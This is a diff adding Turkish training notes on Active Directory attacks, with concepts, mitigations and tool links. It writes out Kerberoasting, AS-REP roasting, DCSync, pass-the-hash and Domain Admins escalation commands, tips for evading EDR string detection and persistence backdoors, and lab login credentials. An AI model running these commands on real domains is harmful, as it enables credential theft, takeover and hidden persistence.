@@ -1,0 +1,255 @@
+not3s
+
+# Struggle Credentials
+
+
+	$ istanbul\hacktrick24 QWEqwe123!@#
+	
+	$ s46.cyberstruggle.com
+
+	$ xfreerdp /u:hacktrick24 /p:'QWEqwe123!@#' /v:184.73.9.202
+
+		rdesktop -u hacktrick24 184.73.9.202
+
+	$ eyup: 52.91.250.242
+
+# AD üzerinde Enterprise veya domain admin grubu dışında;
+
+	DnsADmins, GroupPolicy Creator Owners (GPO üzerinden dll injection vb. gpo'ları basılarak tüm AD'ye saldırılabilir.), Print Operators, Server Operators ve Account Operators gruplarında yetkili bir kullanıcı ele geçirilmesi durumunda yine tüm AD üzerinde farklı metodlar ile komut çalıştırabilmek mümkün hale geliyor. 
+
+# Gruplar'a dahil olan kullanıcılar gruplar üzerinde olan tüm yetkilere sahip olurlar. Bu sebep ile X kullanıcısı direkt olarak Domain Admins veya Enterprise Admins grubunda olmasa da, farklı "gruplar" üzerinden (isterse 50. grup, isterse 500. grup üzerinden fark etmiyor) aynı şekilde o kullanıcı da Domain Admin vb. yetkilerine sahip olabilirler.
+
+# SPN (Service Principal Name) objeler üzerinde bulunur ve objelerin hangi servisi yönettiğini gösterir. Kerberos erişiminde ve iletişiminde bu değerler kullanılmakta.
+
+# KRBTGT, kerberos sırasında kullanılan biletlerin bir kısmı bu hesabın parola özeti ile oluşturulmakta olduğu için sonrasında bu KRBTGT elde edilmesi durumunda tüm sunuculara erişim sağlanabilir duruma geliyor (Kerberos Golden Ticket Attack)
+
+# TGT (Ticket Granting Ticket) Servislere vb. ulaşım sağlamak için alınması gereken biletleri temin eden master ticketi sağlamakta. x servera erişim sağlarken x biletini elde edebilmek için ilgili servise giderek master ticketimiz olan TGT'yi gösteriyoruz ve eğer TGT'mizin buna yetkis ivar ise X serverına erişim için X biletini TGT sayesinde alıyoruz.
+
+# Unconstrained Delegation (incognito ile impersonate_token) yöntemi ile sunucuya kendisine erişen istemcileri taklit etme yeteneğini sağlar ve örnek senaryoda direkt IIS Serivisi üzerinden MSSQL Servisine erişim sağlanabilir duruma geliyor.
+
+# Constrained Delegation ise zafiyetsiz olan şekildeki delege servisidir. Örneğin, IIS Servisi x kullanıcısını sadece MSSQL servisine erişim sağlamak istediğinde impersonate etsin gibi bir kontrol sağlayan mekanizmaya sahiptir. 
+
+	ANcak ticketler içersinde ki servis bilgisi clear-text olarak iletilmekte olduğu için COnstrained Delegation metodu da bypass edilebiliyor. clear-text olarak iletilen servis bilgisi değiştirilerek normalde yetkisi olmayan bir servise doğru impersonate işlemi gerçekleştirilebiliyor.
+
+# Resource Based Constrained Delegation için vekaletle çalışan bir sistem diyebiliriz. ÖRneğin x kullanıcısı y kullanıcısına vekalet vererek benim haklarımı kullanarak z servisine erişim sağlayabilirsin diyor gibi düşünülebilir.
+
+# Objelerin her kullanıcıya (Authenticated Users) read yetkisi olması sebebi ile AD üzerinde çeşilti recon çalışmaları gerçekleştirilebiliyor. Bazı durumlarda bu read yetkilerinin kapatılması AD üzerinde bir sıkıntıya sebebiyet vermiyor, bu konularda AD üzerinde hardening çalışması olarak gerçekleştirilebilir.
+
+# Unattend.xml dosyasının neden cihaza kayıt edildiğine dair bilgileri içeren referans. Direkt local admin parolası bu dosya içerisinde yer alıyor. Sonrasında bu konu için blogpost hazırlanabilir. Yanlış config kaynaklı 
+
+	https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/update-windows-settings-and-scripts-create-your-own-answer-file-sxs?view=windows-11
+
+# Slaytta ki WINNT komutları ile remote cihazlarda ki local grup bilgilerini, local user bilgilerini vb. çekebilmek mümkün oluyor. Bu konu araştırılarak blog yazılabilir. (Win7 ve Server 2008 öncesi cihazlarda WINNT komutları yetkisiz olarak çalıştırılabiliyor ama sonra ki sistemlerde bu WINNT komutları için komutun çalıştırılmak istendiği makinede local admin olmak gerekiyor.)
+
+	([ADSI]'WinNT://10.2.6.105,computer').psbase.children | where {
+	$_.psbase.schemaClassName -eq 'group' } | foreach { ($_.name)[0]}
+
+# Slayttan powershell komutları içinden "tüm userları listele ve description'u içerisinde Password geçen kullanıcıları listele" komutunu çıkart ve not al. 
+
+# powerview installation
+
+	$ [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+	
+	$ Invoke-WebRequest -Uri https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -out PowerView.ps1
+
+	$ Import-Module .\PowerView.ps1
+
+# "net user /domain" gibi komutlar EDR, SIEM gibi komutlar string üzerinden yakalanabiliyor, bunun yerine "net user /do, net user /dom, net user "/do" yazarak yine domain üzerinde komut çalıştırılabilir ve stringe yakalanmasının önüne geçilebilir.
+
+# genericall user yetkisi olan userların parolası remote olarak değiştirilebiliyor
+
+# ADExplorer aracı ile (sysinternals aracı) AD User and Computer Management dashboardı gibi AD'yi inceleyebilmenizi sağlıyor.
+
+# invoke web request komutu basit olarak "iwr" yazılarak çalıştırılabiliyormuş
+
+	$ iwr -uri https://download.sysinternals.com/files/AdExplorer.zip -OutFile AdExplorer.zip
+	$ iwr -uri https://github.com/BloodHoundAD/SharpHound/releases/download/v1.0.3/SharpHound-v1.0.3.zip -OutFile sharp.zip
+
+# bloodhound örnek queryler anlatıldı, bir node'a tıklandığında o node'a ait bilgilerin nasıl elde edildiğini, veya FROM > TO alanı kullanarak from'da yazılan kullanıcıdan Domain admin'e nasıl çıkılır kontrolleri gerçekleştirilebilir. Grafik yorumlamalar ile Graph ekranı incelendi ve neler yapılabileceği söylendi.
+
+	$ sharphound.exe -c all -s
+
+# Örneğin shortest way the domain admin'i seçtik ve graph bizi karşıladı. Burada rastgele bir path üzerine tıklayarak yazılan neo4j querysi elde edilebilir ve sonrasında bu neo4j querysi isteklere göre vb. değiştirilebilerek çalıştırılabilir.
+
+# İlgili path üzerinde ki saldırıya tıklayarak (örneğin bir path çizgisi üzerinde "GenericAll" yazıyor, bu GenericAll'a sağ tıklayarak açılan sekme üzerinde bu zafiyetin ne olduğu, nasıl abuse edilebileceği ve nasıl kullanımının sağlanabileceği gibi bilgiler elde edilebilir.) 
+
+# Roasting saldırısı (parolaya çevrimdışı brute. Bu zafiyet kerberos ticketin parola ile hashlenmesinden kaynaklanıyor.)
+
+# AS-REPRoasting ise KDC'de ticketin onaylanması sonrasında oluşan ticketa yapılan brute-force saldırısıdır. "kullanıcı ayarlarının propertiesi içerisinde do not require Kerberos preauthtentication ayarı açıksa"
+
+# AS-reproasting için powershell komutu var, bu ASREProastable kullanıcıların tespiti için
+
+	$ get-aduser -filter * -properties DoesNotRequirePreAuth | Where-Object {$_.DoesNotRequirePreAuth -eq $true}
+
+# ASReproast ile kullanıcının kerberos ticketinin elde edilmesi
+
+	kullanıcınc usernamesi ile kullanıcının ticketi elde edilebiliyor çünkü ilk bu ticketin elde edilebilmesi için username ile auth olmaya çalışıyor. Bazı uygulamalar bu ayarın "preauth" yapmamasını bekliyor ve bazı kurumlarda bu sebep ile bu ayarlar açık oluyor. Bu değer (Do not require preauth). User Management > User > Properties içerisinden görüşebilir.
+
+	$  .\rubeus.exe asreproast /user:jack.robinson /outfile:hash.txt
+
+	$ john hash.txt
+
+		## jack.robinson:iloveyou
+
+# Kerberoast saldırısında ise ASREP paketi yerine TGSREP paketine yönelik saldırılar gerçekleştiriliyor. Kullanıcı hesabı tarafından yönetilen bir servise erişmek için alınan TGS-REP paketi içerisindeki ST bileti servis kullanıcısının parolası ile şifrelenmektedir. Bu sayede brute-force ile parola elde edilebilir duruma geliyor. 
+
+	## Bir kullanıcının SPN'i (Service Principal Name) var ise bu user bir servis useridir diyebiliriz. Ve bu saldırıda servis userine yönelik saldırı gerçekleştirmek yetki yükseltme noktasında işimize yarayacaktır çünkü çeşitli yetkilere sahip olacaktır. Ayrıca bu service userları genellikle password never expire olarak kullanılmakta olduğu için ayrıca işimize yarar hale geliyor. 
+
+# Kerberoastable Kullanıcıların Powershell ile tespit edilmesi
+
+	$ Get-ADUser -Filter {serviceprincipalname -like "*"} -Properties serviceprincipalname | Format-Table
+
+# Kerberoast saldırısı ile hasin elde edilmesi
+
+	$ .\rubeus.exe kerberoast /user:lilah.herschel /outfile:hash2.txt
+
+		## lilah.herschel:qwerty
+
+## Kerberoasting için alınabilecek önlemler:
+
+	$ Group Managed Service Accountlar için AD 2 adet obje yarattı. Bu objeler sayesinde servis accountların parolaları otomatik olarak değiştiriliyor ve AD üzerinde tutuluyor. İlgili servise erişim sağlanması durumunda AD direkt olarak erişim sağlattırıyor.
+
+# ACL Exploitation (AddMember ACL) ile lilah.herschel kullanıcısı üzerinden Domain Admin'e Privilege Escalation. AddMember ACL'i olduğu için Domain Admin yetkilerinde kullanıcı ekleme hakkımız olmuş oluyor. Bunu tetikleyerek Domain Admin yetkilerinde gruba kullanıcı ekleyebiliyoruz.
+
+	## $SecPassword = ConvertTo-SecureString 'qwerty' -AsPlainText –Force
+
+		(Powershell'de parolayı direkt olarak plain-text olarak değiştirtemiyor, bu sebep ile aşağıdaki komut ile SecureString değere dönüştürmemiz gerekiyor parolayı.)
+
+		# Powerview modülü import ediliyor
+		Import-Module .\PowerView.ps1
+		# Plaintext parola secure-string formatına dönüştürülüyor
+		$SecPassword = ConvertTo-SecureString 'qwerty' -AsPlainText –Force
+		# Kullanıcı adı ve parola ile credential objesi oluşturuluyor
+		$Cred = New-Object System.Management.Automation.PSCredential('istanbul\lilah.herschel',
+		$SecPassword)
+		# Add-DomainGroupMember fonksiyonu ile kullanıcı gruba ekleniyor
+		Add-DomainGroupMember -Identity 'Domain Admins' -Members 'lilah.herschel' -Credential
+		$Cred
+		# Domain Admins grubu üyeleri listeleniyor
+		Get-DomainGroupMember -Identity 'Domain Admins'
+
+# Constrained Delegation – Protocol Transition slaytlarına bakılmalı ve notlar alınmalı
+
+# PrivExchange zafiyeti
+
+# Group Policy Preferences 
+
+	Bu zafiyet SYSVOL dizini altında parolanın şifrelenmiş hali yer alıyor. AES şifrelemesi microsoft tarafından paylaşıldığı için ilgili XML Dosyası içerisinden parola elde edilebiliyor ve AES ile decrypt edilerek parola elde edilebiliyor. GPO'lar çalışsın diye tüm DC'ler üzerinde SYSVOL dizini altına bu XML dosyaları yazılıyor.
+
+		## use auxiliary/scanner/smb/smb_enum_gpp
+
+		## https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
+
+# Constrained Delegation (Local Admin'den NT AUTH SYSTEM'e privesc)
+
+	Tespiti
+
+		$ Get-ADComputer -Filter * -Properties TrustedToAuthForDelegation,msDS-AllowedToDelegateTo | Where-Object {$_.TrustedToAuthForDelegation -eq $true}
+
+	Sömürülmesi
+		$ .\PsExec.exe -accepteula -s powershell.exe
+
+		$ $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel’);
+
+		$ $i = New-Object System.Security.Principal.WindowsIdentity @('Administrator’);
+
+		$ $i0 = $i.Impersonate();
+
+		$ $i0.Undo();
+
+# Constrained Vs UnConstrained farkı, exploit yöntemleri, AD'de hangi ayarlar aktif olduğunda bu zafiyetler olur, hangileri kapatılarsa zafiyetler kapatılır gibi konular araştırılacak.
+
+# enter-pssession -computername <compıtername> [aynı evil-winrm komutunun powershell hali]
+
+# invoke-command -computername <computername> [aynı evil-winrm komutunun powershell hali]
+
+	$$ enter-pssession komut çalıştıracağı yerde bir session oluşturup buradan haberleşiyorken, invoke-command sadece hedef sunucuda belirtilen bir komutu çalıştırıp bırakıyor yani bir session açmıyor.
+
+# Pass the Hash / Over pass the hash (kerberos ticketlerı üzerinden)
+
+# DCSync ile istediğimiz objeye "GetChanges ve GetChangesAll" yetkileri verilerek kendimizi DC gibi gösterip DC'yi replike etmek taklit edilebilir ve kalıcılık sağlanabilir.
+
+	$ mimikatz# lsadump::dcsync /user:krbtgt@istanbul.cyberstruggle.labs
+
+	Tespiti için DC dışından bir makineden replikasyon isteği gelmesi durumunda alert üret vb. gibi önlemler mümkün.
+
+# Bir noktada saldırganın Golden Ticket'ı oluşturması durumunda (dilerse 10 saatlik dilerse 10 yıllık ticketlar oluşturulabilir) kerberos ticketlarının msrc tarafından yayınlanan script ile resetlenmesi gerekmektedir. Ticketların tamamen unavailable olabilmesi için 2 kere kerberos ticketinin resetlenmesi gerekmektedir.
+
+ # DCShadow: DCsync ile biz DC'den data çekiyorudk ama DCShadow'da tam tersi olarak biz DC'ye data gönderebiliyoruz. Bu sayede bazı attribute'lar yaratarak daha gizli backdoorlar sunucu üzerinde yaratılabiliyor. 
+
+# ACL Backdoor
+
+	Sisteme sızılıp domain adminse kullanıcı eklenmesi durumunda siem,edr vb. tarafından alarmlar ötüyor ve çok gürültü çıkarıyor. Bunun yerine kalıcılık sağlamak için ACL Backdoorlar tanımlanabilir. Bu sayede hem detetctionu zor.
+
+		herhangi bir domain adminin parolasını resetleme yetkisi tanımlarsak dilediğimiz zaman domain admine yetki yükseltebilir hale geliriz, writedacl yetkisi verilerek yazma yetkisi verilebilir, AddUser yetkisi tanımlayarak istenilen zaman Domain Admin grubuna kullanıcı eklenmesi vb. sağlanabilir.
+
+		Veya yüksek yetkilere sahip bir obje oluşturularak bu obje sonrasında domain admins grubuna eklenebilir. Bu obje Active Directory management üzerinde direkt olarak görüntülenememekte. Sadece Domain Admins grubuna bakıldığında böyle bir objeye domain admin yetkileri verilmiş olduğu görülebilir ve bu yetkiler kaldırılabilir. Ama örneğin ilgili obje hala silinemez kalıyor.
+
+		Yani kullanıcıya tamamen farklı bir obje oluşturup bu kullanıcıya gerekli yetkileri verdikten sonra kalıcılık sağlanabilir. 
+
+			https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence
+
+			https://grzegorztworek.medium.com/windows-object-permissions-as-a-backdoor-fa33eb7857c4
+
+			https://threathunterplaybook.com/notebooks/windows/05_defense_evasion/WIN-190101151110.html
+
+# AdminSDHolder explotiti de aynı şekilde bir obje oluşturup bu obje üzerinden domain admin haklarında persistent sağlamak amacı ile kullanılıyor.
+
+# Skeleton Key zararlısı ile; standart bir LSASS process içerisine kendi kod bloğunu inject ediyor yani memory injection gerçekleştiriyor. Mimikatz ile bu yapılabiliyor. Bu sayede istenilen bir username için "mimikatz" parolası kullanılabiliyor hale geliyor. Kesinlikle araştırıp bloga çevirilebilir.
+
+	Bu yapılan injection sonrasında DC veya DC'lere rest atılana kadar yani LSASS'dan temizlenene kadar bu zafiyet devam ediyor halde kalıyor çünkü LSASS processi üzerine bu zafiyeti memorye injection ediyor.
+
+# GOlden Tİcket with SIDHİstory INjection ile child domainden parent domaine doğru yetki yükseltme gerçekleştirileblir.
+
+	Get-AD SIDADmin komutu ile hem child domainin (istanbul.cstruggle.com) hem de parent domainin (cstruggle.com) SID bilgileri elde edilebiliyor. Sonrasında mimikatz komutları ile bu SID değerine göre tgt yaratılabilir. TGT yaratıldıktan sonra ilgili domainlere erişim sağlanabilir hale getirilebiliyor.
+
+# Bir domainde hem yetki yükseltmek hem de diğer bir domaine geçiş için önemli bir metodoloji. UNCONSTRAINED DELEGATION EXPLOITATION \w SpoolSvc
+
+	bu zafiyet için unconstraıned delegatıon olan makine üzerinde local admin yetkilerine sahip olmak yeterli oluyor
+
+	unconstrained shell aldık ama kimse sisteme login olmuyo yani impersonate edeceğimiz token bulamıyoruz diyelim. O zaman spool servisi üzerinden (petitpotam gibi) ile bir istek tetikletiyoruz ve spool servisi üzerinden istek gelmesi sayesinde bir tgt hashi geliyor olacak ve biz rubeus ile dinlediğimiz için o tgt hashini dump edebiliyoruz.
+
+	$ rubeus.exe monitor mode (komut pdften bakılacak)
+
+	$ spoolsample.exe <hedef DC> <rubeus ile dinleme yapılan server>
+
+		Ve rubeus dinleme yapan cmd ekranına hedef DC'nin TGT hashi gelmiş oluyor
+
+		SOnrasında ise over the pth yapmak gerekiyor yani pth üzerinden tgt auth
+
+	$ rubeus.exe ptt ticket.. (komut tetiklenecek)
+
+	$ mimikatz.exe
+
+		$$ lsadump::dcsync /domain:cyberstruggle.labs /user:administrator@cyberstruggle.labs
+
+			[not: user parametresinden sonra @ karakteri ile domaini belirtmemizin sebebi: Eğer bir forest yapısı var ise ve admibistrator kullanıcısı birden fazla domainde mevcut ise komut çalışırken hata veriyor. Bu sebep ile administrator kullanıcısının hangi domainden olduğunu belirtmemiz gerekiyor.]
+
+		$$ sekurlsa::pth /user:administrator /domain:cyberstruggle.labs /ntlm:5b2f332r234fsx23423
+
+			Ve artık güncel yetkiler ile yeni bir cmd ekranı açıyor. Açılan bu cmd üzerinden de "enter-pssession" veya "invoke-command" ile parent domainin pc'sine erişim sağlanabilir duruma geliyor.
+
+
+# Hoca AD security için bir kaç ücretsiz/opensource araç önerdi.
+
+# ad setup'u için DetectionLAb kullanılabilir. Ayrıca "badblood" githubu eklenebilir.
+
+# Tools
+
+    https://www.pingcastle.com/download/
+    https://www.purple-knight.com/
+    https://github.com/lkarlslund/adalanche
+    https://github.com/davidprowe/BadBlood
+    https://github.com/WazeHell/vulnerable-AD
+    https://detectionlab.network/
+    https://github.com/orgs/forestallio
+
+# Blogs
+
+	https://www.ired.team/ https://identityandsecuritydotcom.files.wordpress.com/2020/04/adsa-1-1.pdf https://adsecurity.org/ https://forestall.io/blog/
+
+# Active Directory Delegation Yöntemleri
+
+	https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
+
+
